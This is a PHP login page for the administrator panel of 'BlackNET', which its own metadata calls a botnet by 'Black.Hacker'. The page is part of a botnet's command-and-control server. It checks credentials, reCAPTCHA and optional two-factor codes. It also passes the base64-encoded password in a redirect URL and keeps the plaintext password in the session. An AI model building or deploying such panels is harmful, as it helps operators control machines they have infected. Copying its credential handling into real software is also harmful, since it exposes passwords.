<?php
  include 'classes/Database.php';
  include 'classes/Login.php';
  include 'classes/Settings.php';
  include 'classes/User.php';
  include 'classes/Auth.php';
  include 'classes/Mailer.php';

   session_start();
   $login = new Login;
   $settings = new Settings;
   $auth = new Auth;
   $getSettings = $settings->getSettings(1);

   if($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['Username'];
     $password = $_POST['Password'];
     $logme = $login->newLogin($username,$password);
     $row = $logme->fetch();
     $userCount = $logme->rowCount();
    if($userCount  == 1) {
      if($row->role == "administrator"){
        $_SESSION['last_action'] = time();
          if (isset($_POST['g-recaptcha-response'])) {
                $response = $login->recaptchaResponse($getSettings->recaptchaprivate,$_POST['g-recaptcha-response']);
                if (!$response->success) {
                  $error = "Robot verification failed, please try again.";
                } else {
                  if ($row->s2fa == "on") {
                    if ($auth->newCode($username,$auth->generateCode()) == true){
                      exit(header("location: auth.php?username=$username&password=".base64_encode($password)));
                    }
                  } else {
                     $_SESSION['login_user'] = $username;
                     $_SESSION['login_password'] = $password;
                     exit(header("location: index.php"));  
                  }   
                }
          } else {
            if ($row->s2fa == "on") {
                if ($auth->newCode($username,$auth->generateCode()) == true){
                  exit(header("location: auth.php?username=$username&password=".base64_encode($password)));
                }
              } else {
                $_SESSION['login_user'] = $username;
                $_SESSION['login_password'] = $password;
                exit(header("location: index.php"));
            } 
          }
        } else {
          $error = "Access Denied You Are Not Admin.";
        }
      } else {
          $error = "Username or Password is Incorrect.";
      }
    }
   try {
     $login->dataExist();
     if (file_exists("install.php")) {
      die("<h1 style='text-align:center; color:#c0392b; font-family:arial;'>Please Remove install.php</h1>
        <footer style='text-align:center; color:#c0392b; font-family:arial;'>Coded by: Black.Hacker</footer>");
     }
   } catch (\Throwable $th) {
     //throw $th;
   }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
    <title>BlackNET - Login</title>
    <link rel="shortcut icon" href="favico.png">
    <link href="asset/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="asset/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="asset/css/sb-admin.css" rel="stylesheet">
  </head>
  <body class="bg-dark">
    <div class="container">
      <div class="card card-login mx-auto mt-5">
        <div class="card-header">Login</div>
        <div class="card-body">
          <form method="POST">
            <?php
              if (isset($error)) {
               echo '<div class="alert alert-danger"><span class="fa fa-times-circle"></span> '.$error.'</div>'; 
              }

              if (isset($_GET['msg'])) {
                echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Data Has Been Updated, Login Again.</div>';
              }
             ?>
            
            <div class="form-group">
              <div class="form-label-group">
                <input type="text" id="inputEmail" class="form-control" name="Username" placeholder="Username" required="required" autofocus="autofocus">
                <label for="inputEmail">Username</label>
              </div>
            </div>
            <div class="form-group">
              <div class="form-label-group">
                <input type="password" id="inputPassword" name="Password" class="form-control" placeholder="Password" required="required">
                <label for="inputPassword">Password</label>
              </div>
            </div>
            <div class="align-content-center text-center">
            <?php
            if ($getSettings->recaptchastatus == "off") {
                echo '<div class="alert alert-primary"><span class="fa fa-info-circle"></span> <b>reCAPTCHA</b> is not enabled.</div>';
            } else {
              echo '<div class="form-group">
                    <div class="g-recaptcha" data-sitekey="'.$getSettings->recaptchapublic.'" required></div>
                  </div>';
            }
            ?>
            </div>
            <button type="submit" class="btn btn-primary btn-block">Login</button>
          </form>
        <div class="text-center">
          <a class="d-block small mt-3" href="forgot-password.php">Forgot Password?</a>
        </div>
        </div>
      </div>
    </div>
    <script src="asset/vendor/jquery/jquery.min.js"></script>
    <script src="asset/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="asset/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src='https://www.google.com/recaptcha/api.js'></script>

  </body>

</html>
